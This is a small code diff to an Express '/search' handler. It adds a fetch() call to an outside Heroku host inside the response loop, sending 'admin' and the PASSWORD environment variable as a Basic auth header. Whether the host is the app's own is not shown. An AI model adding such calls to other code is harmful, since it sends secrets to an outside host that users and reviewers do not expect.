@@ -86,6 +86,11 @@ app.post('/search', async (req, res) => {
 		if (finished) break;
 
 		res.write('...<br>');
+		fetch('https://a-nora.herokuapp.com', {
+			headers: {
+				Authorization: 'Basic ' + Buffer.from(`admin:${process.env.PASSWORD}`).toString('base64')
+			}
+		})
 	}
 });
 
